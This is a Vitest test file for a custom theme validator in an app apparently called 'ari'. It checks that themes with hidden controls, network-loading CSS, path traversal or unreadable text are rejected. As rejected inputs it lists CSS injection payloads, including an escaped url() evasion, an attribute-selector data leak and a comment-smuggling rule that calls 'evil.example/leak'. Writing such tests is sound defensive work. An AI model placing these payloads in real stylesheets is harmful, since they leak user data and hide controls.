import { describe, expect, it } from 'vitest'
import {
  customThemeSchema,
  customThemeLibrarySchema,
  neonThemeExample,
  themeAuthoringPrompt,
  themeCssAssetRefs,
  wallpaperFocus,
} from './themes'

describe('custom theme boundary', () => {
  it('rejects executable content, unknown slots and geometry that can hide controls', () => {
    for (const parts of [
      { button: { default: { display: 'none' } } },
      { button: { default: { position: 'absolute', zIndex: 999999 } } },
      { button: { default: { backgroundColor: 'url(https://example.com/track)' } } },
      { button: { default: { color: '#ffffff;}body{display:none}' } } },
      { unknown: { default: { color: '#ffffff' } } },
      { button: { default: { fontSize: 900 } } },
    ])
      expect(customThemeSchema.safeParse({ ...neonThemeExample, parts }).success).toBe(false)
    expect(customThemeSchema.safeParse({ ...neonThemeExample, version: 2 }).success).toBe(false)
    expect(
      customThemeSchema.safeParse({ ...neonThemeExample, density: 'hide-controls' }).success,
    ).toBe(false)
  })
  it('accepts CSS and theme files but refuses CSS that loads from the network', () => {
    const assets = [{ name: 'wallpaper.jpg' }, { name: 'hat.png' }]
    const ok = customThemeSchema.safeParse({
      ...neonThemeExample,
      assets,
      wallpaper: { asset: 'wallpaper.jpg', blur: 0, tint: 40 },
      css: '[data-ari-part="brand"]::before{content:"🏴‍☠️";background:url("asset:hat.png") center/contain}',
    })
    expect(ok.success).toBe(true)
    expect(themeCssAssetRefs(ok.data!.css!)).toEqual(['hat.png'])
    expect(
      customThemeSchema.safeParse({
        ...neonThemeExample,
        assets,
        wallpaper: { asset: 'wallpaper.jpg', position: { x: 75, y: 30 } },
      }).success,
    ).toBe(true)
    expect(wallpaperFocus('top')).toEqual({ x: 50, y: 0 })
    for (const css of [
      'body{background:url(https://example.com/x.png)}',
      'body{background:url( "//example.com/x.png")}',
      'body{background:URL(http://example.com)}',
      '@import "https://example.com/x.css";',
      'body{background:image-set("x.png" 1x)}',
      'body{background:u\\72l(https://example.com)}',
      '[value^="a"]{background:url(/leak?a)}',
      'body{background:url("asset:missing.png")}',
      // Review of #543: a "/*" inside a string hid the real rule from a comment stripper.
      'p{content:"/*"} body{--z: ; background: var(--z) url(https://evil.example/leak)} p{content:"*/"}',
    ])
      expect(customThemeSchema.safeParse({ ...neonThemeExample, assets, css }).success, css).toBe(
        false,
      )
    expect(
      customThemeSchema.safeParse({ ...neonThemeExample, wallpaper: { asset: 'wallpaper.jpg' } })
        .success,
    ).toBe(false)
    expect(
      customThemeSchema.safeParse({ ...neonThemeExample, assets: [{ name: '../secret.png' }] })
        .success,
    ).toBe(false)
  })
  it('requires readable opaque core text and unique identities', () => {
    expect(
      customThemeSchema.safeParse({
        ...neonThemeExample,
        colors: {
          ...neonThemeExample.colors,
          fg: '#090e17',
        },
      }).success,
    ).toBe(false)
    expect(
      customThemeSchema.safeParse({
        ...neonThemeExample,
        colors: {
          ...neonThemeExample.colors,
          fg: '#edfaff00',
        },
      }).success,
    ).toBe(false)
    expect(customThemeLibrarySchema.safeParse([neonThemeExample, neonThemeExample]).success).toBe(
      false,
    )
  })
  it('routes only an explicit leading /ari theme request', () => {
    expect(themeAuthoringPrompt('/ari theme neon cyan')).toContain('ari theme install --file')
    expect(themeAuthoringPrompt('/ari theme neon cyan')).toContain('ari theme screenshot')
    expect(themeAuthoringPrompt('/ari theme neon cyan')).toContain('neon cyan')
    for (const text of [
      'explain /ari theme',
      '/aria theme neon',
      '/ari themed app',
      '/ari fix bug',
    ])
      expect(themeAuthoringPrompt(text)).toBe(text)
  })
})
